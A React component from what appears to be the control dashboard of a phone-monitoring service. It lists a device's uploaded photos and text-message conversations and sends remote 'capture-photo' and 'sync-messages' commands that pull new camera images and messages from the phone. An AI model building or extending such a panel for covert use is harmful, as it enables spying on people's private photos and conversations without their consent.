import { useState, useEffect } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { getDevice, getPhotos, getConversations, getThread, sendCommand } from '../services/api';
import { useSocket } from '../contexts/SocketContext';
import {
    HiOutlineArrowLeft,
    HiOutlineCamera,
    HiOutlineChatAlt2,
    HiOutlineInformationCircle
} from 'react-icons/hi';

export default function DeviceDetail() {
    const { id } = useParams();
    const navigate = useNavigate();
    const [device, setDevice] = useState(null);
    const [photos, setPhotos] = useState([]);
    const [conversations, setConversations] = useState([]);
    const [selectedConvo, setSelectedConvo] = useState(null);
    const [thread, setThread] = useState([]);
    const [tab, setTab] = useState('photos');
    const [lightbox, setLightbox] = useState(null);
    const [loading, setLoading] = useState(true);

    const { socket } = useSocket();

    const fetchDeviceData = async () => {
            try {
                const { data: dev } = await getDevice(id);
                setDevice(dev);

                const { data: photoData } = await getPhotos({ deviceId: dev.deviceId, limit: 50 });
                setPhotos(photoData.photos);

                const { data: convos } = await getConversations(dev.deviceId);
                setConversations(convos);
            } catch (err) {
                console.error(err);
            } finally {
                setLoading(false);
            }
        };

    useEffect(() => {
        fetchDeviceData();
    }, [id]);

    useEffect(() => {
        if (!socket) return;

        const handlePhotoUploaded = (data) => {
            if (data.deviceId === device?.deviceId) {
                fetchDeviceData();
                alert('📸 New photo arrived!');
            }
        };

        const handleMessagesSynced = (data) => {
            if (data.deviceId === device?.deviceId) {
                fetchDeviceData();
                if (selectedConvo) loadThread(selectedConvo);
                alert(`💬 Synced ${data.synced} new messages!`);
            }
        };

        socket.on('data:photo-uploaded', handlePhotoUploaded);
        socket.on('data:messages-synced', handleMessagesSynced);

        return () => {
            socket.off('data:photo-uploaded', handlePhotoUploaded);
            socket.off('data:messages-synced', handleMessagesSynced);
        };
    }, [socket, device, selectedConvo]);

    const loadThread = async (address) => {
        setSelectedConvo(address);
        try {
            const { data } = await getThread({ deviceId: device.deviceId, address });
            setThread(data.messages);
        } catch (err) {
            console.error(err);
        }
    };

    const handleCommand = async (command) => {
        try {
            await sendCommand(device.deviceId, command);
            alert(`Command '${command}' sent!`);
        } catch (err) {
            alert(err.response?.data?.message || 'Failed');
        }
    };

    if (loading) {
        return <div className="loading-spinner"><div className="spinner"></div></div>;
    }

    if (!device) {
        return <div className="empty-state"><h3>Device not found</h3></div>;
    }

    return (
        <div>
            <div className="page-header">
                <div className="page-header-actions">
                    <div style={{ display: 'flex', alignItems: 'center', gap: '1rem' }}>
                        <button className="btn btn-ghost btn-sm" onClick={() => navigate('/devices')}>
                            <HiOutlineArrowLeft /> Back
                        </button>
                        <div>
                            <h1>{device.name}</h1>
                            <p>{device.model} • {device.platform} {device.osVersion} • {device.deviceId}</p>
                        </div>
                    </div>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '0.75rem' }}>
                        <span className={`device-status ${device.isOnline ? 'online' : 'offline'}`}>
                            <span className="dot"></span>
                            {device.isOnline ? 'Online' : 'Offline'}
                        </span>
                        <div className="command-panel">
                            <button className="command-btn" onClick={() => handleCommand('capture-photo')} disabled={!device.isOnline}>
                                <HiOutlineCamera className="icon" /> Capture Photo
                            </button>
                            <button className="command-btn" onClick={() => handleCommand('sync-messages')} disabled={!device.isOnline}>
                                <HiOutlineChatAlt2 className="icon" /> Sync Messages
                            </button>
                        </div>
                    </div>
                </div>
            </div>

            {/* Tabs */}
            <div style={{ display: 'flex', gap: '0.5rem', marginBottom: '1.5rem' }}>
                {['photos', 'messages', 'info'].map(t => (
                    <button
                        key={t}
                        className={`btn ${tab === t ? 'btn-primary' : 'btn-ghost'} btn-sm`}
                        onClick={() => setTab(t)}
                    >
                        {t === 'photos' && <HiOutlineCamera />}
                        {t === 'messages' && <HiOutlineChatAlt2 />}
                        {t === 'info' && <HiOutlineInformationCircle />}
                        {t.charAt(0).toUpperCase() + t.slice(1)}
                    </button>
                ))}
            </div>

            {/* Photos Tab */}
            {tab === 'photos' && (
                <div className="card">
                    <div className="card-header">
                        <h3>Photos ({photos.length})</h3>
                    </div>
                    <div className="card-body">
                        {photos.length > 0 ? (
                            <div className="photo-grid">
                                {photos.map((photo) => (
                                    <div key={photo._id} className="photo-item" onClick={() => setLightbox(photo)}>
                                        <img
                                            src={`https://adminpanel-sharad.onrender.com${photo.path}`}
                                            alt={photo.originalName}
                                            loading="lazy"
                                        />
                                        <div className="photo-overlay">
                                            <p>{new Date(photo.createdAt).toLocaleString()}</p>
                                            <p>{(photo.size / 1024).toFixed(1)} KB</p>
                                        </div>
                                    </div>
                                ))}
                            </div>
                        ) : (
                            <div className="empty-state">
                                <div className="empty-state-icon">📸</div>
                                <h3>No photos yet</h3>
                                <p>Send "Capture Photo" command to get photos from this device</p>
                            </div>
                        )}
                    </div>
                </div>
            )}

            {/* Messages Tab */}
            {tab === 'messages' && (
                <div className="detail-layout">
                    <div className="card">
                        <div className="card-header">
                            <h3>Conversations ({conversations.length})</h3>
                        </div>
                        <div className="conversation-list">
                            {conversations.length > 0 ? conversations.map((convo) => (
                                <div
                                    key={convo._id}
                                    className={`conversation-item ${selectedConvo === convo._id ? 'active' : ''}`}
                                    onClick={() => loadThread(convo._id)}
                                >
                                    <div className="message-avatar">
                                        {(convo.contactName || convo._id)?.[0]?.toUpperCase() || '?'}
                                    </div>
                                    <div className="message-content">
                                        <div className="message-content-header">
                                            <span className="message-sender">{convo.contactName || convo._id}</span>
                                            <span className="message-time">{new Date(convo.lastDate).toLocaleDateString()}</span>
                                        </div>
                                        <div className="message-body">{convo.lastMessage}</div>
                                    </div>
                                    {convo.unread > 0 && (
                                        <span className="sidebar-link-badge">{convo.unread}</span>
                                    )}
                                </div>
                            )) : (
                                <div className="empty-state">
                                    <div className="empty-state-icon">💬</div>
                                    <h3>No conversations</h3>
                                </div>
                            )}
                        </div>
                    </div>

                    <div className="card">
                        <div className="card-header">
                            <h3>{selectedConvo ? `Chat with ${selectedConvo}` : 'Select a conversation'}</h3>
                        </div>
                        <div className="card-body">
                            {selectedConvo && thread.length > 0 ? (
                                <div className="thread-view">
                                    {thread.map((msg) => (
                                        <div key={msg._id} className={`thread-message ${msg.type}`}>
                                            {msg.body}
                                            <div className="thread-message-time">
                                                {new Date(msg.messageDate).toLocaleString()}
                                            </div>
                                        </div>
                                    ))}
                                </div>
                            ) : (
                                <div className="empty-state">
                                    <div className="empty-state-icon">👈</div>
                                    <h3>Select a conversation</h3>
                                    <p>Choose a contact from the left to view messages</p>
                                </div>
                            )}
                        </div>
                    </div>
                </div>
            )}

            {/* Info Tab */}
            {tab === 'info' && (
                <div className="card">
                    <div className="card-header"><h3>Device Information</h3></div>
                    <div className="card-body">
                        <table className="data-table">
                            <tbody>
                                {[
                                    ['Name', device.name],
                                    ['Device ID', device.deviceId],
                                    ['Model', device.model],
                                    ['Platform', device.platform],
                                    ['OS Version', device.osVersion || '—'],
                                    ['App Version', device.appVersion],
                                    ['Battery', device.batteryLevel >= 0 ? `${device.batteryLevel}%` : 'Unknown'],
                                    ['Photos', device.photoCount],
                                    ['Messages', device.messageCount],
                                    ['Status', device.isOnline ? '🟢 Online' : '🔴 Offline'],
                                    ['Last Seen', new Date(device.lastSeen).toLocaleString()],
                                    ['Registered', new Date(device.createdAt).toLocaleString()],
                                ].map(([label, value]) => (
                                    <tr key={label}>
                                        <td style={{ fontWeight: 600, color: 'var(--text-secondary)', width: '180px' }}>{label}</td>
                                        <td>{value}</td>
                                    </tr>
                                ))}
                            </tbody>
                        </table>
                    </div>
                </div>
            )}

            {/* Lightbox */}
            {lightbox && (
                <div className="lightbox" onClick={() => setLightbox(null)}>
                    <button className="lightbox-close" onClick={() => setLightbox(null)}>✕</button>
                    <img src={`https://adminpanel-sharad.onrender.com${lightbox.path}`} alt={lightbox.originalName} />
                    <div className="lightbox-info">
                        <p>{lightbox.originalName} • {(lightbox.size / 1024).toFixed(1)} KB • {new Date(lightbox.createdAt).toLocaleString()}</p>
                    </div>
                </div>
            )}
        </div>
    );
}
